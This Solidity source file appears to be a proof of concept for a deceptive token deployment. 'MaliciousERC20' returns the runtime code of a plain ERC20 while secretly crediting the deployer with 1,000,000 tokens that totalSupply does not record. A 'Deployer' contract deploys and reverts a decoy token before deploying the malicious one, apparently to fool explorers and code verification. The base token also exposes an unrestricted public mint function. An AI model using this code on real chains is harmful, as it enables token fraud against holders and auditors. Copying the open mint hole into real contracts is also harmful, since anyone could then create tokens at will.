// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.10;

contract ERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousERC20 is ERC20 {
    constructor() {
        bytes memory bytecode = type(ERC20).runtimeCode;
        balanceOf[msg.sender] = 1_000_000;

        assembly {
            return(add(bytecode, 0x20), mload(bytecode))
        }
    }
}

contract Deployer {
    event Deployed(address addr);

    function deploy() external returns (address) {
        (bool status,) = address(this).call(abi.encodeCall(Deployer.deployAndRevertIt, ()));
        require(!status, "Deployer: deployAndRevertIt should revert");

        return Deployer(address(this)).deployMalicousToken();
    }

    // deploy token and revert it
    function deployAndRevertIt() external {
        Deployer(address(this)).deployToken();
        require(false, "Revert it");
    }

    function deployToken() external returns (address) {
        address token = address(new ERC20());
        emit Deployed(address(token));
        return address(token);
    }

    function dummy() external {}

    // deploy malicous token afterwards
    function deployMalicousToken() external returns (address) {
        address token = address(new MaliciousERC20());
        emit Deployed(address(token));
        return address(token);
    }
}
